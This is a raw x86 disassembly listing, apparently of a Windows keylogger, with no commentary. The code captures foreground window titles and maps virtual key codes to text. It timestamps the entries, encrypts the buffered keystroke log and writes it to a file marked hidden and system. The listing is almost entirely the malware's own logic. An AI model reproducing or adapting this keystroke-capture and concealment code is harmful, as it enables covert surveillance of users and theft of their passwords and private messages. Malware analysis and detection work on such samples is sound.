call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x18 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov edi [ ebp - 0x8 ]
add esp 0xc
push eax
lea ecx [ edi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ edi + 0x54 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx edi
call sub_4040b0
push 0x1f4
call ebx
jmp r-xdata
mov ecx edi
call sub_404c6b
jmp r-xdata
push 0x64
call ebx
jmp r-xdata
lea eax [ ebp - 0x420 ]
mov ecx esi
push eax
push 0x2a
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4116fe
add esp 0x14
test al al
jne r-xdata
and [ ebp - 0x420 ] 0x0
mov ecx 0xf9
xor eax eax
lea edi [ ebp - 0x41f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x0
push 0x2a
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4116fe
add esp 0x14
test al al
je r-xdata
sub_40441a
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
lea eax [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov al [ ebp + 0x18 ]
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x2f ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
pop ebp
retn 0x14
lea eax [ ebp + 0x8 ]
lea ecx [ esi + 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ esi + 0x34 ]
call [ SetEvent@IAT ]
sub_404463
mov eax [ rw-data ]
push ebx
or eax [ rw-data ]
push esi
push edi
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
xor ebx ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x30 ] bl
push ebx
push edi
call [ GetFileSize@IAT ]
xor ecx ecx
cmp ecx [ rw-data ]
jb r-xdata
push ebx
push 0x80
push 0x3
push ebx
push 0x7
push 0x80000000
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp [ esi + 0x3c ] bl
jne r-xdata
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
ja r-xdata
cmp [ rw-data ] 0x31
jne r-xdata
cmp [ esi + 0x30 ] 0x1
je r-xdata
cmp [ esi + 0x3c ] bl
mov [ esi + 0x30 ] 0x1
je r-xdata
cmp eax [ rw-data ]
jb r-xdata
sub esp 0x10
lea eax [ esi + 0x54 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx esi
call sub_4040b0
push 0x2710
call [ Sleep@IAT ]
mov ecx esi
call sub_404c6b
sub_404518
push ebp
mov ebp esp
sub esp 0x448
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x4 ] esi
mov edi r--data
mov ebx rw-data
cmp [ esi + 0x3c ] 0x0
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::empty@IAT ]
test al al
jne r-xdata
push 0x2710
call [ Sleep@IAT ]
mov ecx esi
call sub_404463
lea eax [ esi + 0x4 ]
push edi
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
add esi 0x54
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ GetFileAttributesW@IAT ]
test al 0x2
je r-xdata
push 0x0
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateDirectoryW@IAT ]
push 0x12
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
jne r-xdata
push 0x80
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ SetFileAttributesW@IAT ]
lea eax [ ebp - 0x6 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x448 ]
call sub_402a90
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x18 ]
add eax 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x448 ]
call sub_402b93
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x38 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4115d9
add esp 0x14
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x5 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x28 ]
mov ecx esi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
push edi
lea ecx [ eax + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x13
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x6
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ SetFileAttributesW@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x448 ]
call sub_402b93
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_404743
push ebp
mov ebp esp
sub esp 0x478
xor eax eax
push ebx
cmp [ ebp + 0x8 ] al
push esi
mov ebx ecx
push edi
setne al
add eax 0x5b
push 0x1
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] eax
call sub_401fab
sub esp 0x10
mov esi rw-data
mov edi esp
lea ecx [ ebp - 0x78 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
lea esi [ ebx + 0x54 ]
mov ecx esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::empty@IAT ]
test al al
jne r-xdata
sub esp 0x10
add ebx 0x74
mov eax esp
push ebx
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x78 ]
push [ ebp - 0x4 ]
call sub_402062
lea ecx [ ebp - 0x78 ]
call sub_402094
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
mov ecx esi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x12
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
sub esp 0x10
add ebx 0x74
mov esi esp
lea eax [ ebp - 0x14 ]
push ebx
push rw-data
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x78 ]
push [ ebp - 0x4 ]
call sub_402062
lea ecx [ ebp - 0x24 ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x478 ]
call sub_402a90
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x478 ]
call sub_402b93
sub esp 0x10
add ebx 0x74
mov esi esp
lea eax [ ebp - 0x34 ]
push ebx
push rw-data
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x78 ]
push [ ebp - 0x4 ]
call sub_402062
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
jmp r-xdata
lea ecx [ ebp - 0x78 ]
call sub_4020a3
pop edi
pop esi
pop ebx
leave
retn 0x4
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x78 ]
call sub_402094
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
sub_4048ef
push ebp
mov ebp esp
sub esp 0x58
push ebx
mov ebx [ Sleep@IAT ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
test [ rw-data ] 0x1
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
push 0x1f4
call ebx
call [ GetForegroundWindow@IAT ]
mov edi eax
push edi
call [ GetWindowTextLengthA@IAT ]
mov esi eax
lea eax [ ebp - 0x2 ]
push eax
push 0x0
lea eax [ esi + 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test esi esi
je r-xdata
or [ rw-data ] 0x1
lea eax [ ebp - 0x1 ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_404acc
call sub_41241a
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
mov edi [ ebp - 0x8 ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
call [ GetWindowTextA@IAT ]
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
cmp [ edi + 0x3c ] 0x0
jne r-xdata
lea eax [ ebp - 0x28 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
dec eax
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
push 0x0
lea eax [ ebp - 0x28 ]
sub esp 0x10
mov esi esp
push r--data
push eax
lea eax [ ebp - 0x38 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov edi [ ebp - 0x8 ]
add esp 0xc
mov ecx edi
call sub_40441a
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x3c ] 0x0
jne r-xdata
call sub_4109c6
cmp eax esi
jb r-xdata
cmp [ edi + 0x3d ] 0x0
je r-xdata
mov ecx edi
call sub_405b30
call sub_4109c6
mov esi 0xea60
cmp eax esi
jb r-xdata
lea eax [ ebp - 0x18 ]
push 0xa
push eax
mov eax [ ebp - 0xc ]
xor edx edx
div esi
push eax
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x3 ]
lea ecx [ ebp - 0x58 ]
push 0x0
sub esp 0x10
mov esi esp
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx edi
call sub_40441a
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3e8
mov [ ebp - 0xc ] eax
call ebx
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_404ad7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x3d ] bl
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov edi r--data
mov ecx esp
mov [ esi + 0x3d ] 0x1
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_404cef
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
mov edi [ CreateThread@IAT ]
add esp 0x20
cmp [ esi + 0x3c ] bl
jne r-xdata
push ebx
push ebx
push esi
push sub_4041d9
push ebx
push ebx
call edi
mov [ esi + 0x28 ] eax
mov ecx esi
call sub_404086
cmp [ esi ] ebx
jne r-xdata
push ebx
push ebx
push esi
push sub_4041ca
push ebx
push ebx
call edi
push ebx
push ebx
push esi
push sub_40419b
push ebx
push ebx
call edi
sub_404b7b
push ebx
push esi
xor eax eax
push edi
push eax
push eax
push eax
mov esi ecx
push eax
call [ CreateEventA@IAT ]
cmp [ esi + 0x3d ] 0x0
mov [ esi + 0x34 ] eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn
lea ebx [ esi + 0x14 ]
mov edi r--data
push 0xffffffff
push [ esi + 0x34 ]
call [ WaitForSingleObject@IAT ]
cmp [ esi + 0x3d ] 0x0
jne r-xdata
sub esp 0x10
mov ecx esp
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x5a
mov ecx rw-data
call sub_402062
push edi
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push edi
push ebx
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
sub_404be3
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x3d ] bl
je r-xdata
xor al al
push 0x1
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov edi r--data
mov ecx esp
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_404cef
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
mov [ esi + 0x3d ] bl
push [ esi + 0x34 ]
mov [ esi + 0x28 ] ebx
call [ CloseHandle@IAT ]
cmp [ esi + 0x3c ] bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
mov [ esi ] ebx
sub_404c6b
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x3c ] bl
je r-xdata
xor al al
cmp [ rw-data ] 0x32
mov edi r--data
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
cmp [ esi + 0x3d ] bl
mov [ esi + 0x3c ] bl
jne r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_404cef
mov al 0x1
jmp r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
mov [ esi ] ebx
sub_404cef
push ebp
mov ebp esp
sub esp 0x94
lea eax [ ebp - 0x10 ]
push esi
mov esi ecx
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
lea eax [ ebp - 0x30 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x94 ]
push eax
call [ sprintf@IAT ]
add esp 0x20
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x18 ] 0x0
lea eax [ ebp - 0x94 ]
push eax
jne r-xdata
lea ecx [ esi + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ esi + 0x34 ]
call [ SetEvent@IAT ]
lea ecx [ esi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
leave
retn 0x14
sub_404dad
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
push edi
push 0x1
mov eax [ esi + 0x40 ]
pop ebx
cmp eax 0x2c
ja r-xdata
cmp eax 0x75
ja r-xdata
je r-xdata
sub eax 0x76
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
cmp eax 0x22
ja r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x2e
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_40441a
sub eax 0x23
je r-xdata
je r-xdata
cmp [ esi + 0x38 ] 0x10
mov ecx [ esi + 0x40 ]
mov eax 0xba
jne r-xdata
cmp [ esi + 0x38 ] 0x10
mov eax [ esi + 0x40 ]
jne r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x42
je r-xdata
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x7 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x8
je r-xdata
cmp ecx eax
ja r-xdata
cmp ecx eax
ja r-xdata
add eax 0xffffff46
cmp eax 0x24
ja r-xdata
add eax 0xffffff46
cmp eax 0x24
ja r-xdata
push ebx
lea eax [ ebp - 0x19 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x13 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x6 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
mov eax 0xc0
cmp ecx eax
ja r-xdata
je r-xdata
mov eax 0xc0
cmp ecx eax
ja r-xdata
je r-xdata
mov eax [ esi + 0x40 ]
cmp eax 0x66
ja r-xdata
movzx eax [ eax + lookup_table_4057d8 ]
jmp [ eax * 4 + jump_table_4057a8 ]
movzx eax [ eax + lookup_table_405783 ]
jmp [ eax * 4 + jump_table_405753 ]
push ebx
lea eax [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0xb ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
